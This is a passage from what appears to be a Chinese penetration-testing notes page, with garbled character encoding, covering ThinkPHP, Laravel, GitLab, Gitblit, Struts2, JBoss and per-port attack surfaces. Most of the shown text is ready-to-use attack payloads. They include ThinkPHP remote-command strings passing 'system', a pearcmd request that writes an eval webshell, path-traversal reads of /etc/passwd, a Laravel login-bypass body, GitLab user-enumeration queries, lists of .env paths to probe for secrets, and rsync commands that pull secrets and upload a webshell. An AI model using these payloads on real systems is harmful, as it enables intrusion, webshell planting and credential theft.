æ¼æ´å½¢æˆç‚¹</span></span><br><span class="line"><span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="variable">$value</span>,<span class="number">3600</span>); <span class="comment"># set(ç¼“å­˜æ ‡è¯†ï¼Œç¼“å­˜å€¼ï¼Œç¼“å­˜ä¿ç•™æ—¶é—´)</span></span><br><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="variable">$data</span> . <span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;%0a%0dphpinfo();//&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆçš„ç¼“å­˜æ–‡ä»¶ä½ç½®</span></span><br><span class="line">/runtime/cache/<span class="title function_ invoke__">MD5</span>(name)å‰ä¸¤ä½/<span class="title function_ invoke__">MD5</span>(name)å<span class="number">30</span>ä½.php</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ–‡ä»¶è¯»å–</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?s=index/\think\Lang/load&amp;file=/etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>ååºåˆ—åŒ–</p><p>ä¸¤ç§å½¢å¼payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">POST ?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;s=calc&amp;method=get</span><br><span class="line"></span><br><span class="line">POST ?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯æ‰¾å¥½è·¯ç”±ï¼Œé»˜è®¤æ˜¯ä»¥.&#x2F;public&#x2F;index.phpä½œä¸ºå…¥å£æ–‡ä»¶ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½æ˜¯äºŒå¼€ï¼Œå…¥å£æ–‡ä»¶ä¸ä¸€æ ·</p><p><img src="/../images/image-20230822212120431.png" alt="image-20230822212120431"></p></li><li><p>ThinkPHP&lt;6.0.13ï¼Œå¤šè¯­è¨€æ¨¡å—å†™ğŸï¼ˆè¿™ä¸ªæ¼æ´çš„çŸ¥è¯†ç‚¹åœ¨CTFä¸­å‡ºç°è¿‡å¾ˆå¤šæ¬¡ï¼Œå› ä¸ºdockerä¸‹çš„PHPç¯å¢ƒé»˜è®¤æ»¡è¶³ä»¥ä¸‹å‰ææ¡ä»¶ï¼‰</p><p>å‰ææ¡ä»¶ï¼š</p><ol><li>PHPç¯å¢ƒå¼€å¯äº†<code>register_argc_argv</code></li><li>PHPç¯å¢ƒå®‰è£…äº†pcel&#x2F;pear</li></ol><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#x27;a&#x27;]);?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure><blockquote><p>è®°å¾—åœ¨burpä¸­å‘é€ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå°†&lt;ç¼–ç å¯¼è‡´æ— æ³•è§£æ</p></blockquote></li></ul><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>index.php</p><p><img src="/../images/image-20230926145212432.png" alt="image-20230926145212432"></p><p>æŠ¥é”™ä¿¡æ¯</p><p><img src="/../images/image-20230926145157351.png" alt="image-20230926145157351"></p><ul><li><p>debugæ¨¡å¼ä¸‹ä¿¡æ¯æ³„æ¼</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨ä¸å…è®¸çš„è¯·æ±‚æ–¹æ³•</span><br><span class="line">æˆ–è€…ç›®å½•æ‰«æï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line">.env</span><br><span class="line">vendor/.env</span><br><span class="line">lib/.env</span><br><span class="line">lab/.env</span><br><span class="line">cronlab/.env</span><br><span class="line">cron/.env</span><br><span class="line">core/.env</span><br><span class="line">core/app/.env</span><br><span class="line">core/Database/.env</span><br><span class="line">database/.env</span><br><span class="line">config/.env</span><br><span class="line">assets/.env</span><br><span class="line">app/.env</span><br><span class="line">apps/.env</span><br><span class="line">uploads/.env</span><br><span class="line">sitemaps/.env</span><br><span class="line">site/.env</span><br><span class="line">admin/.env</span><br><span class="line">web/.env</span><br><span class="line">public/.env</span><br><span class="line">en/.env</span><br><span class="line">tools/.env</span><br><span class="line">v1/.env</span><br><span class="line">administrator/.env</span><br><span class="line">laravel/.env</span><br></pre></td></tr></table></figure></li><li><p>ä»»æ„ç”¨æˆ·ç™»å½•&lt;8.23</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">content-type:application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:[0,0],&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>NDay</p><p><a href="https://xz.aliyun.com/t/9030">Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></li></ul><h4 id="CVE-2018-15133"><a href="#CVE-2018-15133" class="headerlink" title="CVE-2018-15133"></a>CVE-2018-15133</h4><ul><li>Laravel framework 5.5.x&lt;&#x3D;5.5.40ï¼ŒLaravel framework 5.6.x&lt;&#x3D;5.6.29</li><li>éœ€è¦çŸ¥é“app_keyï¼ˆdebugæ¨¡å¼ä¸‹çš„base64å­—ç¬¦ä¸²ï¼‰</li></ul><p><a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133">aljavier&#x2F;exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pwn_laravel.py url App_key -c <span class="built_in">command</span> </span><br><span class="line">æˆ–è€…-iè¿›å…¥äº¤äº’æ¨¡å¼</span><br></pre></td></tr></table></figure><p>é‡åˆ°çš„é—®é¢˜</p><ul><li><p>çˆ†ç ´åå°æ—¶ï¼ŒçŠ¶æ€ç å…¨ä¸º419</p><p>Laravelä¸ºäº†é˜²æ­¢è·¨åŸŸæ”»å‡»ä¼šæœ‰ä¸€ä¸ªCSRF-TOKENï¼Œå¦‚æœTokenè¿‡æœŸäº†ï¼Œå‘èµ·çš„è¯·æ±‚å°±ä¼šéƒ½æ˜¯419çŠ¶æ€ç ï¼Œéœ€è¦é‡æ–°è·å–CSRF-TOKEN</p></li></ul><h3 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h3><ul><li><p>ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶â€“CVE-2023-2825â€“å®é™…åˆ©ç”¨æ„Ÿè§‰æŒºéš¾çš„</p><p>å‰ææ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitlab-ee/ce == 16.0.0</span><br><span class="line"></span><br><span class="line">å­˜åœ¨å¯ä»¥è¾¾åˆ°æ ¹â½¬å½•çš„åµŒå¥—å¯å…¬å¼€è®¿é—®åˆ°çš„groupé¡¹â½¬â½½ä¸”å­˜åœ¨é™„ä»¶(issus è¯„è®ºç­‰)</span><br><span class="line">æˆ–æ™®é€šâ½¤æˆ·æƒé™â¼¿åŠ¨åˆ›å»ºå¤šå±‚groupå’Œé¡¹â½¬</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 123ä¸ºissueæ ‡é¢˜ï¼Œuploads/dde0c86647fa452e76b94c9588d7fcbbä¸ºé™„ä»¶æ‰€åœ¨ç›®å½•</span><br><span class="line">http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure></li><li><p>SSRF</p><p><a href="https://www.anquanke.com/post/id/271555">CVE-2021-22214 GITLAB SSRF æœªæˆæƒæ¼æ´-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></li><li><p>RCE</p><p><a href="https://www.anquanke.com/post/id/259862#h2-0">gitlabæœªæˆæƒRCEï¼ˆCVE-2021-22205ï¼‰æ¼æ´å¤ç°åŠæ·±å…¥åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></li><li><p>ä¿¡æ¯æ³„æ¼</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /api/graphql</span><br><span class="line"></span><br><span class="line"># ç”¨æˆ·å</span><br><span class="line">&#123;&quot;query&quot;:&quot;&#123;users&#123;edges&#123;node&#123;username,email&#125;&#125;&#125;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line"># ç”¨æˆ·åï¼Œé‚®ç®±ï¼Œå¤´åƒä¿¡æ¯</span><br><span class="line">&#123;&quot;query&quot;:&quot;&#123;\nusers &#123;\nedges &#123;\n  node &#123;\n    username\n    email\n    avatarUrl\n    status &#123;\n      emoji\n      message\n      messageHtml\n     &#125;\n    &#125;\n   &#125;\n  &#125;\n &#125;&quot;,&quot;variables&quot;:null,&quot;operationName&quot;:null&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Gitblit"><a href="#Gitblit" class="headerlink" title="Gitblit"></a>Gitblit</h3><p><img src="/../images/image-20230922191132957.png" alt="image-20230922191132957"></p><p>ä»£ç ä»“åº“å¯ä»¥ç›´æ¥<code>git clone</code>ã€‚ã€‚ã€‚</p><ul><li><p>Gitblit 1.9.3</p><p>ç›®å½•éå†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/resources//../WEB-INF/web.xml</span><br></pre></td></tr></table></figure></li></ul><h3 id="è‹¥ä¾"><a href="#è‹¥ä¾" class="headerlink" title="è‹¥ä¾"></a>è‹¥ä¾</h3><p><a href="https://fgtbnc.github.io/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">è‹¥ä¾æ¼æ´ | Khaz (fgtbnc.github.io)</a></p><p>é‡åˆ°çš„é—®é¢˜</p><ul><li>ç”¨æˆ·å‡­è¯ï¼ˆå·¥å…·æ˜¯cookieï¼Œä½†æ˜¯é‡åˆ°çš„å¾ˆå¤šéƒ½æ˜¯JWTçš„ï¼‰</li><li>å®šæ—¶ä»»åŠ¡å¤„çš„è¿‡æ»¤</li></ul><h3 id="Phpstudy"><a href="#Phpstudy" class="headerlink" title="Phpstudy"></a>Phpstudy</h3><p>æŒ‡çº¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">responseçš„Serverï¼šServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br></pre></td></tr></table></figure><p>é›†æˆç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginxè§£ææ¼æ´</span><br><span class="line">phpmyadminç›®å½•</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">ã€æ¼æ´å¤ç°ã€‘phpStudy å°çš® Windowsé¢æ¿ RCEæ¼æ´_phpstudy æ¼æ´_æç«ç«å®‰å…¨é˜çš„åšå®¢-CSDNåšå®¢</a></p><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><a href="https://fgtbnc.github.io/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/">shiroæ¼æ´ | Khaz (fgtbnc.github.io)</a></p><h3 id="æµ·åº·å¨è§†"><a href="#æµ·åº·å¨è§†" class="headerlink" title="æµ·åº·å¨è§†"></a>æµ·åº·å¨è§†</h3><ul><li><p>Isecure Centerç»¼åˆå®‰é˜²ç®¡ç†å¹³å°ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><p><img src="/../images/iSecure-Center.png" alt="iSecure-Center"></p></li><li><p>iVMS-5000,iVMS-8700ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><p><img src="/../images/image-20230826111722216.png" alt="image-20230826111722216"></p></li></ul><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p><code>OGNL</code>è¡¨è¾¾å¼æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å…³é”®å‡½æ•°</span><br><span class="line">Ognl.getValue()</span><br></pre></td></tr></table></figure><p>æµ‹è¯•OGNLè¡¨è¾¾å¼<code>$&#123;233*233&#125;</code>ï¼Œå¦‚æœé¡µé¢å›æ˜¾<code>233*233</code>çš„ç»“æœï¼Œåˆ™å­˜åœ¨OGNLè¡¨è¾¾å¼è§£æã€‚</p><table><thead><tr><th align="center">æ¼æ´åç§°</th><th align="center">æ³¨å…¥ç‚¹</th><th align="center">å½±å“ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="center">S2-061</td><td align="center"></td><td align="center">2.0.0 -  2.5.25</td></tr><tr><td align="center">S2-045</td><td align="center">Content-Type</td><td align="center">2.3.5 - 2.3.31ï¼Œ 2.5 -  2.5.10</td></tr><tr><td align="center">S2-046</td><td align="center">æ–‡ä»¶ä¸Šä¼ çš„filenameå€¼ä½ç½®ï¼Œå¹¶éœ€è¦ä½¿ç”¨<code>\x00</code>æˆªæ–­</td><td align="center">2.3.5 - 2.3.31ï¼Œ 2.5 -  2.5.10</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005</span><br><span class="line">S2-008</span><br><span class="line">S2-009</span><br><span class="line">S2-013</span><br><span class="line">S2-016(å®é™…ä¸Š,å¾ˆå¤šéƒ½è€ç³»ç»Ÿéƒ½æ¼è¡¥äº†è¿™ä¸ªæ´,æˆåŠŸç‡è¾ƒé«˜)</span><br><span class="line">S2-019</span><br><span class="line">S2-020</span><br><span class="line">S2-devmode</span><br><span class="line">S2-032</span><br><span class="line">S2-033</span><br><span class="line">S2-037</span><br><span class="line">S2-045</span><br><span class="line">S2-046</span><br><span class="line">S2-048</span><br><span class="line">S2-052</span><br><span class="line">S2-053</span><br><span class="line">S2-057</span><br></pre></td></tr></table></figure><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><blockquote><p>JBossæ˜¯ä¸€ä¸ªåŸºäºJ2EEçš„å¼€å‘æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ã€‚JBossä»£ç éµå¾ªLGPLè®¸å¯ï¼Œå¯ä»¥åœ¨ä»»ä½•å•†ä¸šåº”ç”¨ä¸­å…è´¹ä½¿ç”¨ã€‚JBossæ˜¯ä¸€ä¸ªç®¡ç†EJBçš„å®¹å™¨å’ŒæœåŠ¡å™¨ï¼Œæ”¯æŒEJB1.1ã€EJB2.0å’ŒEJB3çš„è§„èŒƒã€‚ä½†JBossæ ¸å¿ƒæœåŠ¡ä¸åŒ…æ‹¬æ”¯æŒservlet&#x2F;JSPçš„WEBå®¹å™¨ï¼Œ<strong>ä¸€èˆ¬ä¸Tomcatæˆ– Jettyç»‘å®šä½¿ç”¨</strong>ã€‚</p></blockquote><p><a href="https://forum.butian.net/share/504">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Jbossæ¸—é€åˆé›†</a></p><p><img src="/../images/image-20230830142620222.png" alt="image-20230830142620222"></p><p><img src="/../images/image-20230830142653114.png" alt="image-20230830142653114"></p><h1 id="ç«¯å£æ¸—é€"><a href="#ç«¯å£æ¸—é€" class="headerlink" title="ç«¯å£æ¸—é€"></a>ç«¯å£æ¸—é€</h1><p><img src="/../images/beepress-image-187604-1663914501.png" alt="beepress-image-187604-1663914501 (1)"></p><h2 id="åè®®ç±»"><a href="#åè®®ç±»" class="headerlink" title="åè®®ç±»"></a>åè®®ç±»</h2><h3 id="FTP-20-x2F-21"><a href="#FTP-20-x2F-21" class="headerlink" title="FTP-20&#x2F;21"></a>FTP-20&#x2F;21</h3><p><strong>ä»‹ç»</strong></p><p>åº”ç”¨å±‚åè®®ï¼Œç”¨äºæ–‡ä»¶ä¼ è¾“</p><ul><li><p>ç«¯å£21</p><p>ç”¨äºFTPçš„<strong>æ§åˆ¶è¿æ¥</strong>ï¼Œç”¨äºå»ºç«‹å’Œç»´æŠ¤FTPä¼šè¯ã€‚å®¢æˆ·ç«¯é€šè¿‡è¯¥ç«¯å£ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œå‘é€å‘½ä»¤å’Œæ¥æ”¶å“åº”ã€‚</p></li><li><p>ç«¯å£20</p><p>ç”¨äºFTPçš„<strong>æ•°æ®è¿æ¥</strong>ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå½“éœ€è¦ä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæ•°æ®å°†é€šè¿‡ç«¯å£20è¿›è¡Œä¼ è¾“ã€‚</p></li></ul><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>anonymousåŒ¿åè®¿é—®ï¼Œå¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥ä»»æ„è®¿é—®æ–‡ä»¶</li></ul><h3 id="SSH-22"><a href="#SSH-22" class="headerlink" title="SSH-22"></a>SSH-22</h3><p><strong>ä»‹ç»</strong></p><p>ç”¨äºè¿æ¥è¿œç¨‹æœåŠ¡å™¨ï¼Œä½¿ç”¨å…¬é’¥ç®—æ³•è¿›è¡Œé€šä¿¡</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>ä¸Šä¼ å…¬é’¥getshell</li><li>å¼±å£ä»¤getshell</li><li>sshåé—¨æƒé™ç»´æŒ</li></ul><h3 id="Telent-23"><a href="#Telent-23" class="headerlink" title="Telent-23"></a>Telent-23</h3><p><strong>ä»‹ç»</strong></p><p>è·Ÿsshä½œç”¨ç›¸åŒï¼Œä½†æ˜¯æ˜¯æ˜æ–‡é€šä¿¡å¾ˆä¸å®‰å…¨ï¼Œå·²è¢«sshä»£æ›¿</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>ç½‘ç»œå—…æ¢ï¼Œè·å–æ•æ„Ÿä¿¡æ¯</li><li>åˆ¤æ–­TCPåè®®æ˜¯å¦å‡ºç½‘</li></ul><h3 id="SMTP-x2F-SMTPS-25-x2F-465"><a href="#SMTP-x2F-SMTPS-25-x2F-465" class="headerlink" title="SMTP&#x2F;SMTPS-25&#x2F;465"></a>SMTP&#x2F;SMTPS-25&#x2F;465</h3><p><strong>ä»‹ç»</strong></p><p>åº”ç”¨å±‚åè®®ï¼Œç”¨äºé‚®ä»¶çš„å‘é€</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>æœªæˆæƒè®¿é—®&#x2F;å¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥å‘é€é’“é±¼é‚®ä»¶</li></ul><h3 id="DNS-53"><a href="#DNS-53" class="headerlink" title="DNS-53"></a>DNS-53</h3><p><strong>ä»‹ç»</strong></p><p>åº”ç”¨å±‚åè®®ï¼Œç”¨äºå°†åŸŸåè§£æä¸ºIPåœ°å€æˆ–è€…è¿›è¡Œåå‘è§£æã€‚</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>DNSæ¬ºéª—</li><li>DNSç¼“å­˜æŠ•æ¯’</li><li>æ‹’ç»æœåŠ¡æ”»å‡»</li><li>åŸŸä¼ é€</li></ul><h3 id="POP3-110"><a href="#POP3-110" class="headerlink" title="POP3-110"></a>POP3-110</h3><p><strong>ä»‹ç»</strong></p><p>åº”ç”¨å±‚åè®®ï¼Œç”¨äºä»é‚®ä»¶æœåŠ¡å™¨ä¸Šä¸‹è½½ç”µå­é‚®ä»¶åˆ°æœ¬åœ°å®¢æˆ·ç«¯ã€‚</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>æ˜æ–‡ä¼ è¾“</li><li>é‚®ä»¶åŠ«æŒ</li></ul><h3 id="IMAP-143"><a href="#IMAP-143" class="headerlink" title="IMAP-143"></a>IMAP-143</h3><p><strong>ä»‹ç»</strong></p><p>åº”ç”¨å±‚åè®®ï¼Œå…è®¸ç”¨æˆ·åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šç®¡ç†å’Œæ£€ç´¢ç”µå­é‚®ä»¶ã€‚</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><p>åŒPOP3</p><h3 id="SMB-445-x2F-139"><a href="#SMB-445-x2F-139" class="headerlink" title="SMB-445&#x2F;139"></a>SMB-445&#x2F;139</h3><p><strong>ä»‹ç»</strong></p><p>å·¥ä½œåœ¨ä¼šè¯å±‚å’Œè¡¨ç¤ºå±‚ï¼Œç”¨äºå®ç°æ–‡ä»¶å’Œèµ„æºå…±äº«ã€‚å®ƒå…è®¸ç”¨æˆ·åœ¨ç½‘ç»œä¸­çš„<strong>ä¸åŒè®¡ç®—æœºä¸Šè®¿é—®å…±äº«æ–‡ä»¶å¤¹</strong>ã€<strong>æ‰“å°æœº</strong>ä»¥åŠå…¶ä»–ç½‘ç»œèµ„æºï¼Œå¹¶è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€ç›®å½•æµè§ˆã€æƒé™æ§åˆ¶ç­‰æ“ä½œã€‚</p><ul><li><p>ç«¯å£445</p><p>é»˜è®¤ç«¯å£ï¼Œç”¨äºå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„SMBé€šä¿¡ã€‚</p></li><li><p>ç«¯å£139</p><p>ç”¨äºæ—©æœŸç‰ˆæœ¬çš„SMBåè®®</p></li></ul><p><strong>å­˜åœ¨çš„é£é™©</strong></p><ul><li>ä¸»è¦ç”¨äºåæ¸—é€å¦‚æ°¸æ’ä¹‹è“ï¼ŒIPC$ï¼Œæ‰“å°æœºæ¼æ´ç­‰</li></ul><h3 id="Rsync-893"><a href="#Rsync-893" class="headerlink" title="Rsync-893"></a>Rsync-893</h3><p><strong>ä»‹ç»</strong></p><p><code>Rsync</code>æ˜¯<code>Linux</code>ä¸‹çš„ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡<code>rsync</code>åè®®ã€<code>ssh</code>åè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ï¼ˆä½†ä¸æ”¯æŒä¸¤å°è¿œç¨‹è®¡ç®—æœºä¹‹é—´çš„åŒæ­¥ï¼‰ã€‚å¸¸è¢«ç”¨äºåœ¨å†…ç½‘è¿›è¡Œæºä»£ç çš„åˆ†å‘åŠåŒæ­¥æ›´æ–°ï¼Œå› æ­¤ä½¿ç”¨äººç¾¤å¤šä¸ºå¼€å‘äººå‘˜ã€‚</p><p><strong>å­˜åœ¨çš„é£é™©</strong></p><p>å…¶ä¸­<code>rsync</code>åè®®é»˜è®¤ç›‘å¬<code>873</code>ç«¯å£ï¼Œè€Œä¸€èˆ¬å¼€å‘äººå‘˜å®‰å…¨æ„è¯†è–„å¼±çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†<code>rsync</code>æœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®<code>ACL</code>æˆ–è®¿é—®å¯†ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ã€‚</p><ul><li><p>æŸ¥çœ‹ rsync å®ˆæŠ¤ç¨‹åºåˆ†é…çš„æ‰€æœ‰ module åˆ—è¡¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rsync rsync://IP:873</span><br></pre></td></tr></table></figure></li><li><p>ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•åˆ°æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -avz ip://xxx/secret /root/secret</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -avz webshell.php ip://web/</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤</strong></p><p>rsyncé»˜è®¤çš„é…ç½®æ–‡ä»¶<code>/etc/rsyncd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">motd file -&gt; motdæ–‡ä»¶ä½ç½®</span><br><span class="line">log file -&gt; æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="line">path -&gt; é»˜è®¤è·¯å¾„ä½ç½®</span><br><span class="line">use chroot -&gt; æ˜¯å¦é™å®šåœ¨è¯¥ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtrueï¼Œå½“æœ‰è½¯è¿æ¥æ—¶ï¼Œéœ€è¦æ”¹ä¸ºfasle,å¦‚æœä¸ºtrueå°±é™å®šä¸ºæ¨¡å—é»˜è®¤ç›®å½•</span><br><span class="line">read only -&gt; åªè¯»é…ç½®ï¼ˆyes or noï¼‰</span><br><span class="line">list=true -&gt; æ˜¯å¦å¯ä»¥åˆ—å‡ºæ¨¡å—å</span><br><span class="line">uid = root -&gt; ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·å</span><br><span class="line">gid = root -&gt; ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·ç»„</span><br><span class="line">auth users -&gt; è®¤è¯ç”¨æˆ·å</span><br><span class="line">secrets file=/etc/rsyncd.passwd -&gt; æŒ‡å®šå¯†ç æ–‡ä»¶ï¼Œå¦‚æœè®¾å®šéªŒè¯ç”¨æˆ·ï¼Œè¿™ä¸€é¡¹å¿…é¡»è®¾ç½®ï¼Œè®¾å®šå¯†ç æƒé™ä¸º400,å¯†ç æ–‡ä»¶/etc/rsyncd.passwdçš„å†…å®¹æ ¼å¼ä¸ºï¼šusername:password</span><br><span class="line">hosts allow=192.168.0.101  -&gt; è®¾ç½®å¯ä»¥å…è®¸è®¿é—®çš„ä¸»æœºï¼Œå¯ä»¥æ˜¯ç½‘æ®µï¼Œå¤šä¸ªIpåœ°å€ç”¨ç©ºæ ¼éš”å¼€</span><br><span class="line">hosts deny ç¦æ­¢çš„ä¸»æœºï¼Œhostçš„ä¸¤é¡¹å¯ä»¥ä½¿ç”¨*è¡¨ä»»æ„ã€‚</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“ç±»"><a href="#æ•°æ®åº“ç±»" class="headerlink" title="æ•°æ®åº“ç±»"></a>æ•°æ®åº“ç±»</h2><h3 id="MSSQL-1433"><a href="#MSSQL-1433" class="headerlink" title="MSSQL-1433"></a>MSSQL-1433</h3><p>å…³ç³»å‹æ•°æ®åº“</p><h3 id="Oracle-1521"><a href="#Oracle-1521" class="headerlink" title="Oracle-1521"></a>Oracle-1521</h3><h3 id="Mysql-3306"><a href="#Mysql-3306" class="headerlink" title="Mysql-3306"></a>Mysql-3306</h3><h3 id="PostgreSQL-5432"><a href="#PostgreSQL-5432" class="headerlink" title="PostgreSQL-5432"></a>PostgreSQL-5432</h3><h3 id="Reidis-6379"><a href="#Reidis-6379" class="headerlink" title="Reidis-6379"></a>Reidis-6379</h3><h3 id="MongoDB-27017"><a href="#MongoDB-27017" class="headerlink" title="MongoDB-27017"></a>MongoDB-27017</h3><p>éå…³ç³»å‹æ•°æ®åº“</p><ul><li>å¼±å£ä»¤</li><li>æœªæˆæƒè®¿é—®</li><li>NoSqlæ³¨å…¥</li></ul><h3 id="Access-æ— ç«¯å£å·"><a href="#Access-æ— ç«¯å£å·" class="headerlink" title="Access-æ— ç«¯å£å·"></a>Access-æ— ç«¯å£å·</h3><p>Accessæ•°æ®åº“å±äºæ–‡ä»¶å‹æ•°æ®åº“ï¼Œæ‰€ä»¥ä¸éœ€è¦ç«¯å£å·ã€‚</p><p>åœ¨Office 2007ä¹‹å‰çš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .mdb ï¼ŒOffice2007åŠå…¶ä¹‹åçš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .accdb </p><h2 id="WebæœåŠ¡ç±»"><a href="#WebæœåŠ¡ç±»" class="headerlink" title="WebæœåŠ¡ç±»"></a>WebæœåŠ¡ç±»</h2><h3 id="Weblogic-7001"><a href="#Weblogic-7001" class="headerlink" title="Weblogic-7001"></a>Weblogic-7001</h3><h3 id="JBOSS-8080"><a href="#JBOSS-8080" class="headerlink" title="JBOSS-8080"></a>JBOSS-8080</h3><h3 id="Jenkis-8080"><a href="#Jenkis-8080" class="headerlink" title="Jenkis-8080"></a>Jenkis-8080</h3><p><img src="/../images/image-20230925173219085.png" alt="image-20230925173219085"></p><p><img src="/../images/image-20230925173151794.png" alt="image-20230925173151794"></p><h3 id="Zabbix-10051"><a 